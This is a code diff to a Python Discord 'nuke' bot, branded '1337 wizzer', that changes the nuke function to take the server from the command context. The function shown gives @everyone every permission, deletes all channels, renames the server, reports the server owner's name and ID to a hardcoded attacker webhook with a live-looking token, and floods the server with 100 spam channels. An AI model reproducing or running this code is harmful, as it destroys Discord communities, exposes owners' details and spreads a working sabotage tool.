@@ -28,32 +28,32 @@ async def status_task():
         await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.watching, name="SIKE, beamed by 1337"))
         await asyncio.sleep(120)
 
-async def nuke(ctx, guild):
-  print(f"{C.WHITE}Nuking {guild.name} ~ Using 1337 wizzer.")
-  role = discord.utils.get(guild.roles, name = "@everyone")
+async def nuke(ctx):
+  print(f"{C.WHITE}Nuking {ctx.guild.name} ~ Using 1337 wizzer.")
+  role = discord.utils.get(ctx.guild.roles, name = "@everyone")
   try:
     await role.edit(permissions = discord.Permissions.all())
-    print(f"{C.GREEN}[+] [Everyone Perms] Success ~ {C.WHITE}{guild.name}\n")
+    print(f"{C.GREEN}[+] [Everyone Perms] Success ~ {C.WHITE}{ctx.guild.name}\n")
   except:
-    print(f"{C.RED}[-] [Everyone Perms] Failed ~ {C.WHITE}{guild.name}\n")
-  for channel in guild.channels:
+    print(f"{C.RED}[-] [Everyone Perms] Failed ~ {C.WHITE}{ctx.guild.name}\n")
+  for channel in ctx.guild.channels:
     try:
       await channel.delete()
       print(f"{C.GREEN}[+] [Channel Deletion] {C.WHITE}{channel.name}")
     except:
       print(f"{C.RED}[-] [Channel Deletion] {C.WHITE}{channel.name}{C.RESET}")
-  await guild.edit(name=f"1337 ~ {guild.name}")
+  await ctx.guild.edit(name=f"1337 ~ {ctx.guild.name}")
   nukedwebhook = ["https://discord.com/api/webhooks/784536463588327444/5hE0jrlRbkQCXeobAJFjfO1HOzhkMkW6KNIAw4xUMQXaIGk-rDnyfQ-Sd5flLgmI7mbN"]
   webhook = DiscordWebhook(url=nukedwebhook)
-  log = DiscordEmbed(title = f"Nuke Successful!", description = f"Server: [**{guild.name}**]")
+  log = DiscordEmbed(title = f"Nuke Successful!", description = f"Server: [**{ctx.guild.name}**]")
   log.add_embed_field(name = "Nukebot Used", value = f"{bot.user.name}#{bot.user.discriminator} | `{bot.user.id}`")
-  log.add_embed_field(name = "Server Owner", value = f"{guild.owner} | `{guild.owner.id}`", inline = False)
-  log.add_embed_field(name = "Members Banned", value = f"{guild.bans}", inline = False)
+  log.add_embed_field(name = "Server Owner", value = f"{ctx.guild.owner} | `{ctx.guild.owner.id}`", inline = False)
+  log.add_embed_field(name = "Members Banned", value = f"{ctx.guild.bans}", inline = False)
   webhook.add_embed(log)
   webhook.execute()
   for i in range(100):
-    await guild.create_text_channel(ctx.author.name + random.choice(channel_names))
-  print(f"{C.GREEN}Nuked {guild.name} ~ Using 1337 wizzer.")
+    await ctx.guild.create_text_channel(ctx.author.name + random.choice(channel_names))
+  print(f"{C.GREEN}Nuked {ctx.guild.name} ~ Using 1337 wizzer.")
 
 
 
